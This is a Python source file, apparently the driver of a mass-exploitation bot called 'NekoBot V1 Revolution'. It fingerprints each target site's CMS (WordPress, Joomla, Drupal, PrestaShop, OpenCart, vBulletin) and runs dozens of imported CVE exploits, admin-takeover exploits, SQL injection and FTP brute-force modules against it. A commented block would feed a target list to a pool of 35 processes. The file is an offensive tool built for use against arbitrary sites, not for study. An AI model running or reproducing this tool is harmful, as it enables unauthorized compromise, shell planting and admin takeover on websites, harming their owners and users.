
YOUR_Email_For_TAkeAdmin_Exploit = 'lolicode33@gmail.com'  # Edit your email
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
# --------------------------------

VERSION = 'V1 Revolution'

# ----------------------------------------
import cms
import sys, os, threading, time, re
#sys.path.append("C:/Users/maria/Videos/Fiverr/NekoBotV1-Updated")
from multiprocessing import Pool

try:
    from bs4 import BeautifulSoup
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install bs4')
    print('   [-] you need to install bs4 Module')
    sys.exit()

try:
    import requests
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install requests')
    print('   [-] you need to install requests Module')
    sys.exit()

try:
    os.mkdir('result')
except:
    pass
try:
    os.mkdir('cms')
except:
    pass

# ------------PrestaShop-----------
#import Presta_1attributewizardpro
#import Presta_advancedslider
#import Presta_attributewizardpro
#import Presta_attributewizardpro3
#import Presta_attributewizardpro_x
#import Presta_cartabandonmentpro
#import Presta_columnadverts
#import Presta_fieldvmegamenu
#import Presta_homepageadvertise
#import Presta_homepageadvertise2
#import Presta_jro_homepageadvertise
#import Presta_lib
#import Presta_megamenu
#import Presta_nvn_export_orders
#import Presta_pk_flexmenu
import Presta_productpageadverts
import Presta_psmodthemeoptionpanel
import Presta_simpleslideshow
import Presta_soopabanners
import Presta_soopamobile
import Presta_tdpsthemeoptionpanel
import Presta_videostab
import Presta_vtermslideshow
import Presta_wdoptionpanel
import Presta_wg24themeadministration
import cartabandonmentproOld
# ------------Wordpress-------------
import cherry_plugin
import CVE_2008_3362Download_Manager
import CVE_2014_4725wysija
import CVE_2014_9735_revsliderShell
import CVE_2015_1579_revsliderConfig
import CVE_2015_4455_gravityforms
import CVE_2015_4455_gravityformsindex
import CVE_2015_5151_revsliderCSS
import CVE_2017_16562userpro
import CVE_2018_19207wp_gdpr_compliance
import CVE_2019_9879wp_graphql
import formcraft
import Headway
import WooCommerce_ProductAddonsExp
import WpCateGory_page_icons
import Wp_addblockblocker
import wp_barclaycart
import wp_content_injection
import wp_eshop_magic
import Wp_HD_WebPlayer
import Wp_Job_Manager
import wp_miniaudioplayer
import Wp_pagelines
import wp_support_plus_responsive_ticket_system
import wp_ungallery
import WP_User_Frontend
import viral_optinsExploit
import CVE_2019_9978SocialWarfare
import WPJekyll_Exporter
import Wp_cloudflare
import Wprealia
import Wpwoocommercesoftware
import Wp_enfold_child
import Wp_contabileads
import Wp_prh_api
import Wp_dzs_videogallery
import Wp_mmplugin
import wpinstall
import Wordpress
import FTPBruteForce
# -------------Joomla---------------
import Com_adsmanager
import Com_alberghi
import Com_CCkJseblod
import Com_extplorer
import Com_Fabric
import Com_FoxContent
import Com_b2jcontact
import Com_bt_portfolio
import Com_civicrm
import Com_jwallpapers
import Com_oziogallery
import Com_redmystic
import Com_simplephotogallery
import Com_facileforms
import Com_Hdflvplayer
import Com_Jbcatalog
import Com_JCE
import com_jdownloads
import Com_JCEindex
import Com_Joomanager
import Com_Macgallery
import com_media
import Com_Myblog
import Com_rokdownloads
import Com_s5_media_player
import Com_SexyContactform
import CVE_2015_8562RCEjoomla
import CVE_2015_8562RCEjoomla2019
import CVE_2016_9838TakeAdminJoomla
import Joomla

# --------------Drupal---------------
import CVE_2014_3704Drupal_add_Admin
import CVE_2018_7600Drupalgeddon2
import CVE_2019_6340Drupal8RESTful
import Drupal_mailchimp
# --------------Oscommerce-----------
#import osCommerce
# -------------opencart--------------
import Opencart
# --------------vBulletin-----------
import CVE_2019_16759vBulletinRCE
# --------------Unknown--------------
import CVE_2006_2529fckeditor
import env
import Sqli


list =[]
def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def Banner():
    bb = open('banner.txt', 'r').read()
    print(bb.format(r, g, r, w, r, y, w))

def options():
    option = '''
    '''.format(r, w, c, g, c, g, c, w)
    print(option)

# --------------------------------------- Multi Scan -----------------------------------------------

def Rez(site, i):
    global list
    list.append(i)

def MultiThreadScan(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith("https://"):
            site = site.replace('https://', '')
        else:
            pass
        Check_CMs = cms.DetectCMS(site)
        if Check_CMs == 'wordpress':
            i = CVE_2019_9978SocialWarfare.Exploit(site)
            Rez(site, i)
            i = cherry_plugin.Exploit(site)
            Rez(site, i)
            i = CVE_2008_3362Download_Manager.Exploit(site)
            Rez(site, i)
            i = CVE_2014_4725wysija.Exploit(site)
            Rez(site, i)
            i = CVE_2014_9735_revsliderShell.Exploit(site)
            Rez(site, i)
            i = CVE_2015_1579_revsliderConfig.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityformsindex.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityforms.Exploit(site)
            Rez(site, i)
            i = CVE_2015_5151_revsliderCSS.Exploit(site)
            Rez(site, i)
            i = CVE_2017_16562userpro.Exploit(site)
            Rez(site, i)
            i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = formcraft.Exploit(site)
            Rez(site, i)
            i = Wp_contabileads.Exploit(site)
            Rez(site, i)
            i = Wp_prh_api.Exploit(site)
            Rez(site, i)
            i = Wp_mmplugin.Exploit(site)
            Rez(site, i)
            i = Wp_dzs_videogallery.Exploit(site)
            Rez(site, i)
            i = Headway.Exploit(site)
            Rez(site, i)
            i = WooCommerce_ProductAddonsExp.Exploit(site)
            Rez(site, i)
            i = WpCateGory_page_icons.Exploit(site)
            Rez(site, i)
            i = Wp_addblockblocker.Exploit(site)
            Rez(site, i)
            i = wp_barclaycart.Exploit(site)
            Rez(site, i)
            i = wp_content_injection.Exploit(site)
            Rez(site, i)
            i = wp_eshop_magic.Exploit(site)
            Rez(site, i)
            i = WPJekyll_Exporter.Exploit(site)
            Rez(site, i)
            i = Wp_cloudflare.Exploit(site)
            Rez(site, i)
            i = Wprealia.Exploit(site)
            Rez(site, i)
            i = Wpwoocommercesoftware.Exploit(site)
            Rez(site, i)
            i = Wp_enfold_child.Exploit(site)
            Rez(site, i)
            i = Wp_HD_WebPlayer.Exploit(site)
            Rez(site, i)
            i = Wp_Job_Manager.Exploit(site)
            Rez(site, i)
            i = wp_miniaudioplayer.Exploit(site)
            Rez(site, i)
            i = Wp_pagelines.Exploit(site)
            Rez(site, i)
            i = wp_support_plus_responsive_ticket_system.Exploit(site)
            Rez(site, i)
            i = wp_ungallery.Exploit(site)
            Rez(site, i)
            i = WP_User_Frontend.Exploit(site)
            Rez(site, i)
            i = viral_optinsExploit.Exploit(site)
            Rez(site, i)
            i = wpinstall.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Wordpress')
            Rez(site, i)
            mkobj = Wordpress.Wordpress()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            FTPBruteForce.Exploit(site)
        elif Check_CMs == 'joomla':
            i = CVE_2015_8562RCEjoomla.Exploit(site)
            Rez(site, i)
            i = CVE_2015_8562RCEjoomla2019.exploit(site)
            Rez(site, i)
            i = CVE_2016_9838TakeAdminJoomla.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = com_jdownloads.Exploit(site)
            Rez(site, i)
            i = Com_FoxContent.Exploit(site)
            Rez(site, i)
            i = Com_b2jcontact.Exploit(site)
            Rez(site, i)
            i = Com_bt_portfolio.Exploit(site)
            Rez(site, i)
            i = Com_civicrm.Exploit(site)
            Rez(site, i)
            i = Com_jwallpapers.Exploit(site)
            Rez(site, i)
            i = Com_oziogallery.Exploit(site)
            Rez(site, i)
            i = Com_redmystic.Exploit(site)
            Rez(site, i)
            i = Com_simplephotogallery.Exploit(site)
            Rez(site, i)
            i = Com_JCE.Exploit(site)
            Rez(site, i)
            i = Com_JCEindex.Exploit(site)
            Rez(site, i)
            i = com_media.Exploit(site)
            Rez(site, i)
            i = Com_Myblog.Exploit(site)
            Rez(site, i)
            i = Com_adsmanager.Exploit(site)
            Rez(site, i)
            i = Com_alberghi.Exploit(site)
            Rez(site, i)
            i = Com_CCkJseblod.Exploit(site)
            Rez(site, i)
            i = Com_extplorer.Exploit(site)
            Rez(site, i)
            i = Com_Fabric.Exploit(site)
            Rez(site, i)
            i = Com_facileforms.Exploit(site)
            Rez(site, i)
            i = Com_Hdflvplayer.Exploit(site)
            Rez(site, i)
            i = Com_Jbcatalog.Exploit(site)
            Rez(site, i)
            i = Com_Joomanager.Exploit(site)
            Rez(site, i)
            i = Com_Macgallery.Exploit(site)
            Rez(site, i)
            i = Com_rokdownloads.Exploit(site)
            Rez(site, i)
            i = Com_s5_media_player.Exploit(site)
            Rez(site, i)
            i = Com_SexyContactform.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Joomla')
            Rez(site, i)
            mkobj = Joomla.JooMLaBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'drupal':
            i = CVE_2014_3704Drupal_add_Admin.Exploit(site)
            Rez(site, i)
            i = CVE_2018_7600Drupalgeddon2.Exploit(site)
            Rez(site, i)
            i = Drupal_mailchimp.Exploit(site)
            Rez(site, i)
            i = CVE_2019_6340Drupal8RESTful.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Drupal')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)

            
        elif Check_CMs == 'opencart':
            mkobj = Opencart.OpenCart()
            i = CVE_2006_2529fckeditor.Exploit(site, 'OpenCart')
            Rez(site, i)
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'oscommerce':
            i = osCommerce.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'osCommerce')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'vBulletin':
            i = CVE_2019_16759vBulletinRCE.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'vBulletin')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'prestashop':
            i = Presta_1attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_advancedslider.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro3.Exploit(site)
            Rez(site, i)
            i = Presta_attributewizardpro_x.Exploit(site)
            Rez(site, i)
            i = Presta_cartabandonmentpro.Exploit(site)
            Rez(site, i)
            i = Presta_columnadverts.Exploit(site)
            Rez(site, i)
            i = Presta_fieldvmegamenu.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_homepageadvertise2.Exploit(site)
            Rez(site, i)
            i = Presta_jro_homepageadvertise.Exploit(site)
            Rez(site, i)
            i = Presta_lib.Exploit(site)
            Rez(site, i)
            i = Presta_megamenu.Exploit(site)
            Rez(site, i)
            i = Presta_nvn_export_orders.Exploit(site)
            Rez(site, i)
            i = Presta_pk_flexmenu.Exploit(site)
            Rez(site, i)
            i = Presta_productpageadverts.Exploit(site)
            Rez(site, i)
            i = Presta_psmodthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_simpleslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_soopabanners.Exploit(site)
            Rez(site, i)
            i = Presta_soopamobile.Exploit(site)
            Rez(site, i)
            i = Presta_tdpsthemeoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_videostab.Exploit(site)
            Rez(site, i)
            i = Presta_vtermslideshow.Exploit(site)
            Rez(site, i)
            i = Presta_wdoptionpanel.Exploit(site)
            Rez(site, i)
            i = Presta_wg24themeadministration.Exploit(site)
            Rez(site, i)
            i = cartabandonmentproOld.Exploit(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'unknown':
            i = CVE_2006_2529fckeditor.Exploit(site, 'unknown')
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            i = Sqli.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'deadTarget':
            print(' {}[-] {}{} {}--> {} Timeout!!{}'.format(r, w, site, c, y, w))
    except:
        print(' {}[-] {}{} {}--> {} Crashed!!{}'.format(r, w, site, c, y, w))
    return list
 
#a=MultiThreadScan("https://www.Wordpress.com/")
#print(a)
#fuck = "Your Brain Error"
#yap = "Please Wait A Second..."
#print("fdddddddgdfnjfdhjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj")
#clear()
#try:
    #Target = sys.argv[1]
    #try:
        #print(yap)
        #x = open(Target, 'r').read().splitlines()
        #TEXTList = open(Target, 'r').read().splitlines()
        #p = Pool(35)
        #p.map(MultiThreadScan, TEXTList)
    #except:
        #try:
            #clear()
            #print(fuck)

        #except:
            #Target = sys.argv[1]


#except:
    #clear()
    #Banner()
    #options()
    #sys.exit()
